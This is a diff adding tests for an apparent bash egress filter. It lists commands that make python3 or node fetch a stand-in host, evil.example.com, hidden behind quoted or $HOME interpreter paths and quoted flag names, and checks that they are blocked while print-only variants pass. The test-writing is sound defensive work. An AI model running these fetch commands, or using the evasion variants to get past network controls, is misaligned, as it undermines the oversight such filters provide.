@@ -980,3 +980,21 @@ describe('#779 round 7: backslash-newline anywhere, quoted interpreter path and 
     expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
   })
 })
+
+describe('#779 round 8: quoted Unicode and $HOME interpreter paths, quoted flag name', () => {
+  // Marveen comment 3865 A, B, the code-level fetcher variant.
+  const U = 'https://evil.example.com/x'
+  const PY = `'import urllib.request; urllib.request.urlopen("${U}")'`
+  it.each([
+    [`"/home/gábor/venv/bin/python3" -c ${PY}`], [`"$HOME/venv/bin/python3" -c ${PY}`],
+    [`node "--eval"="fetch('${U}')"`], [`node --"eval=fetch('${U}')"`],
+  ])('blocks %s', (cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
+  })
+  it.each([
+    [`"/home/gábor/venv/bin/python3" -c 'print("${U}")'`], [`node "--eval"="console.log('${U}')"`],
+    [`echo "$HOME/venv/bin/python3" -c 'print("${U}")'`],
+  ])('lets %s through', (cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
+  })
+})
